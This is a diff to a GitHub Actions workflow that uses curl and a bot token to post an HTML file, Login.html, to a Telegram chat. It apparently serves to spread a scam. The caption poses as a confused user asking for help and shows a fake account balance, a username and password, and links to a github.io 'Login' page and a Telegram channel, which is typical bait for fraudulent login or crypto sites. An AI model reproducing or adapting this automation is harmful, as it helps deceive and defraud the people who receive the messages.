@@ -16,7 +16,8 @@ jobs:
           BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
           CHAT_ID: ${{ secrets.CHAT_ID }}
         run: |
+          CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
           curl -s -F document=@Login.html \
           -F chat_id=${CHAT_ID} \
-          -F caption="How does this work?\nI don't really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36" \
+          -F caption="$CAPTION" \
           https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
